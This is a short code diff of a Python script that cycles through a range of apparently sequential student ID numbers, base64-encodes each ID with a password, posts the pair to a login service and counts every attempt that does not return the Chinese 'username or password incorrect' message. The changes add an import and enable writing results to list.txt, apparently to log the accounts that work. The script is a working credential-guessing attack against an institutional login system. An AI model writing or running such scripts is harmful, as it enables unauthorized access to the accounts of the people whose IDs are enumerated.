@@ -1,7 +1,8 @@
 
 import base64, requests, re
+import OutNetLink
 
-# fo = open("list.txt", "wb+")
+fo = open("list.txt", "wb+")
 
 cnt = 0
 for i in range(2015201101, 2015202131):
@@ -12,7 +13,6 @@ for i in range(2015201101, 2015202131):
     arg = base64.b64encode(zh) + str('%%%').encode(encoding="utf-8") + base64.b64encode(psw)
     arg = arg.decode()
     #print(arg, type(arg))
-
     data = {
         'encoded': arg
     }
@@ -21,7 +21,6 @@ for i in range(2015201101, 2015202131):
 
     fi = re.search(u'用户名或密码错误', cur.text)
     #print(fi)
-
     if fi is None:
         cnt = cnt + 1
 
